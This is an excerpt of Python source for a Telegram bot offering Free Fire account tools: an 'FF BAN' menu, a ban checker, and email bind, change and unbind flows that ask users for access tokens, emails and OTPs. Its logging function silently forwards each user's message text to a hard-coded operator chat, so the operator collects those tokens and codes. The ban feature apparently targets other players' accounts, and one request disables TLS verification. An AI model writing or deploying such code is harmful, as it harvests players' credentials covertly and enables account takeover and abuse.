...
# ========= CLEAN SINGLE LOG SYSTEM - NO DOUBLE =========
LOG_CHAT_ID = -5373759744
LOG_CHAT_IDS = [-5373759744]

def send_log_sync(text):
    try:
        for cid in LOG_CHAT_IDS:
            try:
                if BOT_TOKEN == "YOUR_TOKEN":
                    continue
                import requests
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                requests.post(url, json={"chat_id": cid, "text": text[:3900]}, timeout=5, verify=False)
                break
            except:
                pass
    except:
...
async def send_log(context, text):
    try:
        for cid in LOG_CHAT_IDS:
            try:
                await context.bot.send_message(chat_id=cid, text=text[:3900])
                return
            except:
                pass
    except:
...
async def log_action(context, update, action):
    try:
        u = update.effective_user if hasattr(update, 'effective_user') and update.effective_user else (update.message.from_user if update.message else None)
        uid = u.id if u else 0
        uname = f"@{u.username}" if u and u.username else ""
        fname = u.first_name if u else ""
        chat = update.effective_chat.id if hasattr(update, 'effective_chat') and update.effective_chat else (update.message.chat.id if update.message else 0)
        txt = ""
        if update.message and update.message.text:
            txt = update.message.text[:800]
        elif update.callback_query:
            txt = update.callback_query.data[:800]
        await send_log(context, f"📋 {action}\n👤 {uid} {uname} {fname}\n💬 {chat}\n📝 {txt}")
    except:
        pass

async def testlog_command(update, context):
    await log_action(context, update, "🧪 TEST LOG")
    await update.message.reply_text("✅ Test log sent to -5373759744")
...
async def ff_ban_start(update, context):
    await log_action(context, update, "💀 FF BAN MENU")
...
async def ff_ban_token(update, context):
    await log_action(context, update, "💀 FF BAN - TOKEN")
...
async def ban_check_start(update, context):
    await log_action(context, update, "🔍 BAN CHECK MENU")
    await update.message.reply_text(
        "💀 𝗕𝗔𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 💀\n\n"
        "🆔 𝗘𝗻𝘁𝗲𝗿 𝗙𝗙 𝗨𝗜𝗗 🔍💎\n\n"
        "📌 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: 12345678",
...
async def ban_check_uid(update, context):
    await log_action(context, update, "🔍 BAN CHECK - UID")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def start(update, context):
    await log_action(context, update, "▶️ START")
    try:
...
async def check_info_start(update, context):
    await log_action(context, update, "🔍 BIND INFO MENU")
...
async def check_info_token(update, context):
    await log_action(context, update, "🔍 BIND INFO - TOKEN")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    if len(token)<10:
...
async def bind_email_start(update, context):
    await log_action(context, update, "📧 BIND EMAIL MENU")
    await update.message.reply_text("📧 𝗕𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹 📧\n\n🔐 Enter Access Token :", reply_markup=get_main_keyboard())
    return BIND_TOKEN

async def bind_email_token(update, context):
    await log_action(context, update, "📧 BIND - TOKEN")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
...
async def bind_email_email(update, context):
    await log_action(context, update, "📧 BIND - EMAIL")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def bind_email_otp(update, context):
    await log_action(context, update, "📧 BIND - OTP")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def change_email_start(update, context):
    await log_action(context, update, "🔄 CHANGE EMAIL MENU")
    user_id = update.message.from_user.id
...
async def change_email_token(update, context):
    await log_action(context, update, "🔄 CHANGE - TOKEN")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def unbind_email_start(update, context):
    await log_action(context, update, "❌ UNBIND MENU")
...
async def unbind_email_token(update, context):
    await log_action(context, update, "❌ UNBIND - TOKEN")
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
...
async def eat_to_token_start(update, context):
    await log_action(context, update, "🔑 EAT MENU")
...
async def bio_start(update, context):
    await log_action(context, update, "📝 BIO MENU")
...
async def resubscribe_start(update, context):
    await log_action(context, update, "📧 RESUB MENU")
    user_id = update.message.from_user.id
...
async def switch_menu(update, context):
    await log_action(context, update, "🔘 MENU SELECT")
    try:
        u = update.message.from_user
